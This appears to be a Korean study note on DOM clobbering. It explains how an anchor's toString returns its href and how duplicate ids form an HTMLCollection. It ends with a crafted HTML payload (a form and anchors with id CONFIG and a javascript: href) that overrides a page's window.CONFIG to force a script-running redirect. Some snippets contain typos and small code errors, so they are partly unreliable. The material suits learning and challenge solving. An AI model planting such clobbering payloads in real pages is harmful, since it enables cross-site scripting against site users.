원하는 값을 쓰기 위해서는 return 값이 object 가 아닌

저희가 조작할 수 있는 데이터가 들어가야합니다.

 

어떠한 함수를 사용하는지에 따라서 데이터를 넣을 수 있는지 없는지가 나누어집니다.

string to code table

태그 중 ToString 방법이 Object.prototype으로 부터 계승 되는지 

아니면 다른 방식으로 정의 되는지 확인하여야 합니다.

 

이게 무슨 말이냐면,

객체들이 가지고 있는 ToString 이라는 function 이

어떠한 방법으로 구현?(계승) 되는지를 판단하는 겁니다.

Elements 를 포함하는 개체들 중 prototype.toString 과

Object.prototype.toString 이 이 다른 것을 찾아라 하는 코드입니다.

결과는 <a> 태그와 <area> 태그가 있네요

ex)
    <a id="a"> </a>
    <div id="b"> </div>
    <p id="t"> </p>

    Console 창
        window.a.toString()
        ""
        windows.b.toString()
        "[object HTMLDivElement]"
        windows.t.toString()
        "[object HTMLParagraphElement]"

자 그러면 A Tag의 (object , HTMLAnchorElement) 의 toString은 어디서 값을 가져오는 걸까요?

https://developer.mozilla.org/en-US/docs/Web/API/HTMLHyperlinkElementUtils/toString
위의 보시면 "href" 값을 반환한다고 되어 있습니다.

이를 이용해서 값을 변조하는 예시를 보겠습니다.

<script>
window.CONFIG = inwdow.CONFIG || {
    version: "v20190816",
    KeyValue: false,
    ToLocation: "http://a.kr"
    DefaultLocation: "http://a.sub.kr"
}
if(window.CONFIG.KeyValue !== false) { // KeyValue 가 false 아닐시 Tolocation으로 이동
    location.href=window.CONFIG.ToLocation;
}
else {  // false 일시 DefaultLocation으로 이동
    location.href=window.CONFIG.DefaultLocation;
}
</script>

목표 : alert 발생
    조건 1: CONFIG 가 False가 아니어야함
    조건 2: CONFIG.Location이 js alert를 가르켜야함

<form id=CONFIG>
    <input name=KeyValue /> // "<input name=ketVlaue" /> 출력
    <a name="ToLocation" href="javascript://alert(1);" /> // undefined b/c a 태ㅐ그는 form 속성값으로 사용 불가
</form>

HTML Collections에 대한 활용
    <a id="hello">1</a>
    <a id="hello">2</a>

    동일 id a tag 존재
    window.hello 출력시
    HTMLCollection(2) [a#hello, a#hello, hello: a#hello]
    >0: a#hello
    >1: a#hello
        length:2
    >hello: a#hello
    
    란 HTMLCollection이 반환

    window.hello[0]
    <a id="hello">1</a>
    window.hello[1]
    <a id="hello">2</a>
    와 같이 접근 가능

    <a id="hello" name="test">1</a> 
    <a id="hello">2</a>
    위와 같이 새로운 속성도 생성 가능

답 :
<form id=CONFIG>
    <input name=KeyValue /> // "<input name=ketVlaue" /> 출력
    <a id="CONFIG"/>
    <a id="CONFIG" name="ToLocation" href="javascript://alert(1);" /> // undefined b/c a 태ㅐ그는 form 속성값으로 사용 불가
</form>
